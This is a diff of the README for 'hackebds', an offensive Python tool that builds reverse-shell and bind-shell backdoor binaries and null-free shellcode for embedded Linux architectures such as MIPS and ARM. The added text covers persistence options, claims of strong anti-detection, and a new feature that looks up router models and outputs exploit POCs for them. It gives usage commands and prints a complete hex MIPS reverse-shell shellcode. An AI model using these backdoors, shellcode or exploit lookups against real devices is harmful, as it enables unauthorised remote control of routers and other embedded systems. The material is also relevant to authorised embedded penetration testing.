@@ -1,4 +1,5 @@
 # hackebds
+
 ![PyPI - Wheel](https://img.shields.io/pypi/wheel/hackebds)![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pwntools)
 [![Downloads](https://static.pepy.tech/badge/hackebds)](https://pepy.tech/project/hackebds)
 
@@ -12,16 +13,18 @@
 
 ## fuction
 
-**In 0.3.1 version ,bind_shell generate fuction has big bug, This will cause the file generation to fail，This version has been unpatched, please use version 0.3.2 and latest**
-
-**On Android reverse_ shell_ File and bin_ There are some bugs in the shell function. Please replace it with aarch64**
 
 This tool is embedded in the security test of the device. There are two main functions:
 
-1.  Generate **backdoor programs** of various architectures. The backdoor program is packaged in shellless pure shellcode and is smal，Pure static backdoor .**Armv5, Armv7, Armv8, mipsel, mips，mips64，mipsel64，powerpc, powerpc64，sparc,sparc64  are now supported, and they are still being updated** (PS:bash support is added to the reverse shell after version 0.3.1). If the backdoor of the reverse shell is generated with the - power parameter, the reverse shell will continue to be generated on the target machine)
-2.  Generate **reverse_shell shellcode** of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips, mips64, mipsel64, powerpc, powerpc64，sparc  are now supported, and they are still being updated**
-3.  Generate bind of various architectures bind_Shell file.
-4.  Support command line generation backdoor and shell code, Strong anti hunting ability,characterized by light, small, efficient and fast
+1. Generate **backdoor programs** (only ELF) of various architectures. The backdoor program is packaged in shellless pure shellcode and is smal，Pure static backdoor .**Armv5, Armv7, Armv8, mipsel, mips，mips64，mipsel64，powerpc, powerpc64，sparc,sparc64,mipsn32  are now supported, and they are still being updated** (PS:bash support is added to the reverse shell after version 0.3.1). If the backdoor of the reverse shell is generated with the - power parameter, the reverse shell will continue to be generated on the target machine)
+
+2. Generate **reverse_shell shellcode** (only linux) of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips, mips64, mipsel64, powerpc, powerpc64,sparc,mipsn32  are now supported, and they are still being updated**
+
+3. Generate bind of various architectures bind_Shell(only ELF) file, -power can persistent bind_shell
+
+4. Sort out the exploitable vulnerability POC or EXP of the embedded device, and search and output the basic information and POC of the device model in use: Function of equipment, Architecture of equipment,Device CPU manufacturer,Device CPU model,WEB service program of the device, and so on
+
+5. Support command line generation backdoor and shell code, Strong anti hunting ability,characterized by light, small, efficient and fast
 
 
 ## install
@@ -29,12 +32,20 @@ This tool is embedded in the security test of the device. There are two main fun
 Just use pip to install, if the installation fails, try to use sudo to install
 
 ```
+Use pip install:
 pip(3) install -U hackebds
+
+local install:
+git clone https://github.com/doudoudedi/hackEmbedded
+sudo ./start.sh
 ```
+
 （If you want this tool to run on a MacOS system, you need to include python/bin in the bashrc environment variable）
+
 ```
 echo 'export PATH="/Users/{you id}/Library/Python/{your installed python}/bin:$PATH"'>> ~/.bashrc
 ```
+
 ![image-20221125095653018](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221125095653018.png)
 
 
@@ -65,58 +76,116 @@ Ubuntu（debian）:
    ```
 
    ![image-20221102181217933](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181217933.png)
+
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
    ```
+
    By default, the reverse shell backdoor is created using sh. If bash is required (PS: here, the bash command needs to exist on the target device)
-   
+
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash
    ```
-   
+
    If you need to generate a backdoor and constantly create reverse shells (the CPU occupied by the test is about% 8)
-   
+
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
    ```
+
    
-   
-   
+
    ![image-20221102183017775](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102183017775.png)
-   
+
    ```
    hackebds -bind_port 8080 -passwd 1234 -arch mips -model DIR-823 -res bind_shell
    ```
+
    Create bind_shell to monitor the shell as sh, -power fuction can give -shell bash	
-   
+
    ```
    hackebds -bind_port 8081 -arch armelv7 -res bind_shell -passwd 1231 -power
    ```
-   
+
    The bind_shell process will not stop after being disconnected, and supports repeated connections (currently this function is not supported by powerpc and sparc series)
-   
+
    ![image-20221102182939434](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102182939434.png)
+
    
-   
-   
+
    Generate cmd_file function is updated. Only need to specify the - cmd parameter to generate programs for various architectures to execute corresponding commands , -envp Environment variables are separated by commas
-   
+
    ```
    hackebds  -cmd "ls -al /" -arch powerpc  -res cmd_file
    ```
-   
-   ![image-20230106153510332](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153510332.png)
-   
-   The list relationship between the output model and the architecture is added to the function of generating the backdoor for the specified model, which is convenient for observation and modification
-   
+
+   ![image-20230106153459125](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153459125.png)
+
+   The list relationship between the output model and the architecture is added to the function of generating the back door of the specified model to facilitate the user to observe and modify. The output information will be enhanced after version 0.3.5, such as (60 device information, POC40+or so):
+   Function of equipment
+   Architecture of equipment
+   Device CPU manufacturer
+   Device CPU model
+   WEB service program of the device
+   Device default SSH service support
+   Can monitoring be realized
+   Device default telnet user password
+   Device sdk support
+   Openwrt support for devices
+   Whether the device is vulnerable
+   POC output
+
    ```
    hackebds -l
    ```
+
+   ![image-20230213151548871](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213151548871.png)
+
+   Add the retrieval of device information. Use - s to search for the - model parameter. This search is fuzzy and insensitive to case. Try to use the device information with the highest matching degree between lowercase output and input when inputting
+
+   If the following error occurs
+
+   hackebds: error: argument -model: expected one argument
+
+   Please set all parameters to lowercase or lowercase mixed with uppercase. I guess it is due to the conflict between python and bash in the interpretation of uppercase and lowercase letters
+
+   ```
+   hackebds -model ex200 -s
+   ```
+
+   If the following warning occurs during command output
+
+   /usr/local/lib/python3.8/dist-packages/fuzzywuzzy/fuzz.py:11: UserWarning: Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning
+     warnings.warn('Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning')
+
+   If the following warning occurs during command output, you can use the following command to install python-levenshtein. After installation, the command retrieval speed can be increased by about 4 times
+
+   ```
+   pip install python-levenshtein
+   ```
+
+   ![image-20230213105520663](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105520663-20230213151846373.png)
+
+   The POC corresponding to the generated device can use - p or -- poc, which may be python scripts, commands, etc., and may need to be modified by yourself
+
+   ```
+   hackebds -model ex200 -p
+   ```
+
+   ![image-20230213105925356](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105925356.png)
+
+   If a vulnerability is found in the test and you want to add the basic information of a new device to this tool, you can use the - add function for POC files or "/tmp/model_tree_info/" The format of the directory directory of the new device under the info/directory can refer to the standard generated format. After the insertion, you can use the tool search and POC generation functions，Finally, if you need to fill in the POC file information, you can put it in "/tmp/model_tree_info/xxx/POC" directory will be read if retrieved again
+
+   ```
+   hackebds -add
+   ```
+
+   ![image-20230213111024854](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213111024854.png)
+
+   If there are device information errors, POC errors, or you want to integrate your collected device information with vulnerabilities, please contact me doudoudedi233@gmail.com
+
    
-   ![image-20230116204717279](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230116204717279.png)
-   
-   ![image-20230106153942787](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153942787.png)
-   
+
 2. Generate backdoor programs of various architectures, encapsulate pure shellcode, and successfully connect to the shell
 
 ```
@@ -208,6 +277,7 @@ example:
 [+] No NULL byte shellcode for hex(len is 264):
 \xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
 ```
+
 3. Added that shellcode for calling execve cannot be generated in shellcraft (change context generate mips64(el), powerpc shell code for execve("/bin/sh",["/bin/sh"]),0))
 
    ```
@@ -231,7 +301,7 @@ Tests can leverage chips and architectures
 
 Mips:
 MIPS 74kc V4.12 big endian,
-MIPS 24kc V5.0  little endian (Ralink SoC)
+MIPS 24kc V5.0  little endian (Ralink SoC) like MediaTek MT7621
 Ingenic Xburst V0.0  FPU V0.0  little endian
 
 Armv7:
@@ -244,7 +314,7 @@ BCM2711
 Powerpc, sparc: qemu
 
 
-## :beer:enjoy hacking(happy Chinese new Year!)
+## :beer:enjoy hacking
 
 
 ## updating
@@ -278,6 +348,8 @@ Powerpc, sparc: qemu
 
  2023.1.29 0.3.3 -The power function adds support for bind_shell, bind_shell is more stable, and fixes some bugs in the execution of bind_shell and cmd_file files of the aarch64 architecture
 
+2023.3.7 0.3.6 Added support for the mipsn32 architecture (this architecture may be encountered in devices such as zyxel firewalls)
+
 ## Problems to be solved
 
 Support the backend of the loongarch64 architecture and the generation of the bind_shell program (binutils has been integrated into the mainline, but cannot be installed directly through apt)
@@ -298,33 +370,3 @@ CVE-2022-40023 DOS_attack pip install -U  mako (The vulnerability does not apply
 CVE-2021-20270 DOS_attack pip install -U  pygments (The vulnerability does not apply to this tool)
 
  0.2.5 Version Repair directory traversal in the specified model
-
- ## Verion List
-
-| VERSION                                                      | PUBLISHED    | DIRECT VULNERABILITIES |
-| ------------------------------------------------------------ | ------------ | ---------------------- |
-| [0.3.2](https://security.snyk.io/package/pip/hackebds/0.3.2) | 18 Jan, 2023 | 0C0H0M0L               |
-| [0.3.1](https://security.snyk.io/package/pip/hackebds/0.3.1) | 16 Jan, 2023 | 0C0H0M0L               |
-| [0.3.0](https://security.snyk.io/package/pip/hackebds/0.3.0) | 6 Jan, 2023  | 0C0H0M0L               |
-| [0.2.9](https://security.snyk.io/package/pip/hackebds/0.2.9) | 26 Dec, 2022 | 0C0H0M0L               |
-| [0.2.8](https://security.snyk.io/package/pip/hackebds/0.2.8) | 6 Dec, 2022  | 0C0H0M0L               |
-| [0.2.7](https://security.snyk.io/package/pip/hackebds/0.2.7) | 22 Nov, 2022 | 0C0H0M0L               |
-| [0.2.3](https://security.snyk.io/package/pip/hackebds/0.2.3) | 15 Nov, 2022 | 0C0H0M0L               |
-| [0.2.2](https://security.snyk.io/package/pip/hackebds/0.2.2) | 8 Nov, 2022  | 0C0H0M0L               |
-| [0.2.1](https://security.snyk.io/package/pip/hackebds/0.2.1) | 7 Nov, 2022  | 0C0H0M0L               |
-| [0.2.0](https://security.snyk.io/package/pip/hackebds/0.2.0) | 2 Nov, 2022  | 0C0H0M0L               |
-| [0.1.9](https://security.snyk.io/package/pip/hackebds/0.1.9) | 2 Nov, 2022  | 0C0H0M0L               |
-| [0.1.6](https://security.snyk.io/package/pip/hackebds/0.1.6) | 27 Oct, 2022 | 0C0H0M0L               |
-| [0.1.5](https://security.snyk.io/package/pip/hackebds/0.1.5) | 26 Oct, 2022 | 0C0H0M0L               |
-| [0.1.3](https://security.snyk.io/package/pip/hackebds/0.1.3) | 27 Jun, 2022 | 0C0H0M0L               |
-| [0.1.2](https://security.snyk.io/package/pip/hackebds/0.1.2) | 27 Jun, 2022 | 0C0H0M0L               |
-| [0.1.1](https://security.snyk.io/package/pip/hackebds/0.1.1) | 27 Jun, 2022 | 0C0H0M0L               |
-| [0.0.9](https://security.snyk.io/package/pip/hackebds/0.0.9) | 21 May, 2022 | 0C0H0M0L               |
-| [0.0.8](https://security.snyk.io/package/pip/hackebds/0.0.8) | 5 May, 2022  | 0C0H0M0L               |
-| [0.0.7](https://security.snyk.io/package/pip/hackebds/0.0.7) | 30 Apr, 2022 | 0C0H0M0L               |
-| [0.0.6](https://security.snyk.io/package/pip/hackebds/0.0.6) | 30 Apr, 2022 | 0C0H0M0L               |
-| [0.0.5](https://security.snyk.io/package/pip/hackebds/0.0.5) | 29 Apr, 2022 | 0C0H0M0L               |
-| [0.0.4](https://security.snyk.io/package/pip/hackebds/0.0.4) | 29 Apr, 2022 | 0C0H0M0L               |
-| [0.0.3](https://security.snyk.io/package/pip/hackebds/0.0.3) | 29 Apr, 2022 | 0C0H0M0L               |
-| [0.0.2](https://security.snyk.io/package/pip/hackebds/0.0.2) | 29 Apr, 2022 | 0C0H0M0L               |
-| [0.0.1](https://security.snyk.io/package/pip/hackebds/0.0.1) | 29 Apr, 2022 | 0C0H0M0L               |
